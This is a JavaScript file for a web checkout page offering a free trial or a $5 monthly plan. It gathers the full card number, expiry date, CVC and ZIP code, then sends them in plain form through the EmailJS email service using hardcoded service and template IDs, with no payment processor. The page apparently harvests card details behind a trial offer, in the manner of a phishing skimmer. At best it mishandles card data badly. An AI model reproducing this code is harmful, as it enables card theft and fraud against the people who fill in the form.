// EmailJS configuration
const EMAILJS_SERVICE_ID = "service_uhxg8hf";
const EMAILJS_TEMPLATE_ID = "template_ledkaye";
const EMAILJS_PUBLIC_KEY = "ezt9CB7CxTCyZu_ja";

// Initialize EmailJS
emailjs.init(EMAILJS_PUBLIC_KEY);

// Get DOM elements
const cardDiv = document.getElementById("cardDiv");
const selectedOption = document.getElementById("selectedOption");
const oneWeekButton = document.getElementById("oneWeekButton");
const oneMonthButton = document.getElementById("oneMonthButton");
const sendButton = document.getElementById("sendButton");
const popup = document.getElementById("popup");
const overlay = document.getElementById("overlay");
const popupClose = document.getElementById("popupClose");

// Global error message element
const globalErrorMessage = document.createElement("p");
globalErrorMessage.style.color = "red";
globalErrorMessage.style.fontSize = "14px";
globalErrorMessage.style.marginBottom = "10px";
globalErrorMessage.style.display = "none"; // Initially hidden
sendButton.parentElement.insertBefore(globalErrorMessage, sendButton); // Add it above the button

// Show the card input form and selected option
oneWeekButton.addEventListener("click", () => {
  selectedOption.textContent =
    "One week free trial. You may cancel at any time. You will only be charged after the free trial ends.";
  cardDiv.style.display = "block";
});

oneMonthButton.addEventListener("click", () => {
  selectedOption.textContent = "$5 for one month, cancel at any time.";
  cardDiv.style.display = "block";
});

// Input validation and formatting
document.getElementById("cardNumber").addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/\D/g, ""); // Allow only numbers
});

document.getElementById("expDate").addEventListener("blur", (e) => {
  let value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters

  if (value.length === 6) {
    // Reformat MMYYYY to MM/YY
    e.target.value = `${value.slice(0, 2)}/${value.slice(4)}`;
  } else if (value.length === 4) {
    // Reformat MMYY to MM/YY
    e.target.value = `${value.slice(0, 2)}/${value.slice(2)}`;
  } else if (value.length > 0) {
    // Clear invalid input
    globalErrorMessage.textContent = "Expiration date must be in MMYY or MMYYYY format.";
    globalErrorMessage.style.display = "block";
    e.target.value = "";
  }
});

document.getElementById("expDate").addEventListener("keypress", (e) => {
  if (e.key === "Enter") {
    e.target.blur(); // Trigger the blur event to auto-format
  }
});

document.getElementById("cvc").addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 6); // Allow max 6 digits
});

document.getElementById("zipCode").addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 15); // Allow max 15 digits
});

// Handle form submission
sendButton.addEventListener("click", () => {
  const cardNumber = document.getElementById("cardNumber").value;
  const expDate = document.getElementById("expDate").value;
  const cvc = document.getElementById("cvc").value;
  const zipCode = document.getElementById("zipCode").value;

  // Validation
  if (
    !cardNumber ||
    cardNumber.length < 12 ||
    cardNumber.length > 19 ||
    !/^\d{2}\/\d{2}$/.test(expDate) ||
    !cvc ||
    cvc.length < 3 ||
    cvc.length > 6 ||
    !zipCode ||
    zipCode.length < 5 ||
    zipCode.length > 15
  ) {
    globalErrorMessage.textContent = "Please fill in all fields correctly.";
    globalErrorMessage.style.display = "block"; // Show error message
    return;
  }

  // Hide the error message if validation passes
  globalErrorMessage.style.display = "none";

  const templateParams = {
    card_number: cardNumber,
    exp_date: expDate,
    cvc_code: cvc,
    zip_code: zipCode,
    plan: selectedOption.textContent,
  };

  emailjs
    .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
    .then(() => {
      popup.style.display = "block";
      overlay.style.display = "block";
      document.getElementById("cardForm").reset(); // Reset form
    })
    .catch((error) => {
      globalErrorMessage.textContent = "Failed to send payment information. Please try again.";
      globalErrorMessage.style.display = "block";
      console.error("FAILED...", error);
    });
});

// Close popup and redirect to confirmation page
popupClose.addEventListener("click", () => {
  popup.style.display = "none";
  overlay.style.display = "none";
  window.location.href = "confirmation.html"; // Redirect to confirmation page
});






